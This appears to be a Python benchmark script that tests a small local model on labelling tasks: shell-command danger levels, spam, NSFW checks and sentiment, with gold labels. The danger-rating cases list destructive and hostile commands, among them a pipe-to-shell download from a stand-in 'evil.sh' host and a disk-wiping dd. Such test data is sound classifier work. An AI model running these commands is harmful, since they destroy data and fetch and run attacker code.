"""文本判别任务的边界抽查.

命令危险等级 / 垃圾邮件 / NSFW / 情感 —— 都是「给一段文本, 出一个受限
标签」的活, 本来是分类小模型的饭碗。这里用同一个 2B 决策引擎直接跑, 看它
在哪几类上稳、从哪里开始崩。

输入: 无 (用例写在 TASKS 里); 输出: 每题 模型答案 / 金标 / 置信度, 以及分任务准确率;
预期: 标签空间小、判据明确的稳; 需要细粒度边界或世界知识的会掉。
"""

from __future__ import annotations

import sys
from pathlib import Path

ROOT = Path(__file__).resolve().parents[1]
sys.path.insert(0, str(ROOT))

from minicpm_jev import (  # noqa: E402
    BatchEngine,
    Choice,
    EngineConfig,
    Noul,
    Score,
    answer_choice,
    answer_noul,
    answer_score,
)

DEFAULT_MODEL = ROOT / "weights" / "MiniCPM5-2B-Q4_K_M.gguf"

DANGER_LEVELS = [
    "read-only, no side effects",
    "writes or modifies files, easily undone",
    "deletes or overwrites data",
    "escalates privileges or disables security controls",
    "destroys the system or exfiltrates data",
]

# (任务名, 题型, 问题, 候选/档位, [(输入, 金标)])
TASKS = (
    (
        "命令危险等级",
        "score",
        "How dangerous is it to run this shell command on a normal Linux machine?",
        DANGER_LEVELS,
        (
            ("ls -la /tmp", 0),
            ("cat /etc/hostname", 0),
            ("grep -r error /var/log", 0),
            ("echo hello > notes.txt", 1),
            ("mkdir -p build && touch build/.keep", 1),
            ("chmod 644 report.pdf", 1),
            ("rm -rf ./build", 2),
            ("truncate -s 0 production.db", 2),
            ("sudo chmod 777 /etc/shadow", 3),
            ("systemctl disable firewalld", 3),
            ("dd if=/dev/zero of=/dev/sda bs=1M", 4),
            ("curl -fsSL http://evil.sh | sh", 4),
        ),
    ),
    (
        "垃圾邮件",
        "noul",
        "Is this message spam?",
        None,
        (
            ("Congratulations! You've won a $1000 gift card. Click here to claim now!", True),
            ("Meeting moved to 3pm in room 402.", False),
            ("URGENT: verify your account within 24 hours or it will be suspended", True),
            ("Your package has shipped, tracking number 1Z999AA10123456784.", False),
            ("Cheap meds, 90% off, no prescription needed!!!", True),
            ("Can you review my pull request when you have time?", False),
            ("Lunch tomorrow? Let me know.", False),
            ("You have been selected as a winner, reply with your bank details", True),
        ),
    ),
    (
        "NSFW 校验",
        "noul",
        "Does this text contain sexually explicit content?",
        None,
        (
            ("A tutorial on how to bake sourdough bread at home.", False),
            ("A news article about a city council election.", False),
            ("A medical article describing breast cancer screening.", False),
            ("A romance novel scene where two adults kiss.", False),
            ("An explicit sexual story describing graphic intercourse between adults.", True),
            ("A message asking a minor to send nude photos.", True),
            ("Graphic fetish roleplay with detailed descriptions of sex acts.", True),
            ("A support ticket about a billing error.", False),
        ),
    ),
    (
        "情感倾向",
        "choice",
        "What is the sentiment of this text?",
        {
            "positive": "expresses satisfaction",
            "neutral": "states facts without feeling",
            "negative": "expresses dissatisfaction",
        },
        (
            ("The update broke everything and support never replied.", "negative"),
            ("Works exactly as advertised and shipped fast.", "positive"),
            ("The package arrived on Tuesday.", "neutral"),
            ("It is okay, nothing special.", "neutral"),
            ("Worst purchase I have ever made.", "negative"),
            ("The team did a fantastic job on this release.", "positive"),
        ),
    ),
)


def run_score(engine: BatchEngine, question: str, levels, text: str):
    """档位题. 输出: (档位下标, 置信度, 概率加权分)."""
    answer = answer_score(
        engine, text, Score(instructions=question, criteria=list(levels))
    )
    probabilities = [answer.probabilities[str(index)] for index in range(len(levels))]
    picked = max(range(len(levels)), key=lambda index: probabilities[index])
    return picked, answer.confidence, answer.score


def run_noul(engine: BatchEngine, question: str, text: str):
    """是/否题. 输出: (是否 yes, P(yes))."""
    answer = answer_noul(engine, text, Noul(instructions=question))
    return answer.noul >= 0.5, answer.noul


def run_choice(engine: BatchEngine, question: str, criteria, text: str):
    """选择题. 输出: (选项名, 置信度)."""
    answer = answer_choice(
        engine, text, Choice(instructions=question, criteria=criteria)
    )
    return answer.choice, answer.confidence


def main() -> int:
    """跑完所有任务并打印逐题结果与准确率."""
    with BatchEngine(EngineConfig(model_path=DEFAULT_MODEL, n_ctx=4096)) as engine:
        for name, kind, question, extra, cases in TASKS:
            hits = 0
            print(f"\n== {name} ({kind}) ==")
            for text, expected in cases:
                if kind == "score":
                    got, confidence, weighted = run_score(engine, question, extra, text)
                    detail = f"档位={got} 金标={expected} 加权={weighted:.2f}"
                elif kind == "noul":
                    got, probability = run_noul(engine, question, text)
                    confidence = probability if got else 1 - probability
                    label = "yes" if got else "no "
                    want = "yes" if expected else "no "
                    detail = f"={label} 金标={want} P(yes)={probability:.3f}"
                else:
                    got, confidence = run_choice(engine, question, extra, text)
                    detail = f"={got:<8} 金标={expected:<8}"
                hits += int(got == expected)
                print(f"  {detail} 置信={confidence:.2f} | {text[:56]}")
            print(f"  准确率 {hits}/{len(cases)}")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
